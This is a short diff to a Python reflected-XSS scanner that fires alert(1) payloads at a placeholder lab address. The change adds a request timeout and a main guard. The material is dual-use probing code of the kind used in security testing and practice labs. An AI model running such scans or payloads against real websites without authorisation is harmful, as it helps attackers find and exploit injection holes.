@@ -6,8 +6,9 @@ def scan_xss(target):
                 '"<img src=x onerror=alert(1)>", 
                 "'><svg onload=alert(1)>"]
     for payload in payloads:
-        resp = requests.get(f"{target}?q={payload}")
+        resp = requests.get(f"{target}?q={payload}", timeout=5)
         if payload in resp.text:
             print(f"🔥 XSS VULN: {payload}")
 
-scan_xss("http://10.10.10.x")
+if __name__ == "__main__":
+    scan_xss("http://10.10.10.x")
